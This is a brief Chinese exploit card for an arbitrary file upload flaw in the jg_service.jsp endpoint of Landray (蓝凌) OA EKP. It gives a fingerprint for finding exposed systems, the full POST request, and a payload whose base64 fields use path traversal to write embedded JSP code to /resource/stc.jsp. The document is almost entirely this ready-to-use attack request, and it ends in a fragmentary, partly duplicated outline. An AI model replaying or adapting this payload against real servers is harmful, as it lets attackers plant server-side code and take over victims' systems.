# 蓝凌OAEKPjg_service存在任意文件上传漏洞

- **系统**：蓝凌　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="Landray 蓝凌OA"`
- **请求**：`POST /sys/attachment/sys_att_main/jg_service.jsp HTTP/1.1`
- **关键头**：`Content-type: application/x-www-form-urlencoded`　`Content-Length: 206`

**请求体 / payload**
```
DBSTEP V3.0    124            0              999
DBSTEP=REJTVEVQ
OPTION=U0FWRUFTSFRNTA==
HTMLNAME=Li4vLi4vLi4vLi4vLi4vZWtwL3Jlc291cmNlL3N0Yy5qc3A=
RECORDID=
DIRECTORY=
<% out.println(111*11);%>

上传文件位置
/resource/stc.jsp
```

**其他**
- 蓝凌OA EKP jg\_service存在任意文件上传漏洞: * 一、漏洞简介
* 二、漏洞简介
* 三、资产测绘
* 四、漏洞复现
***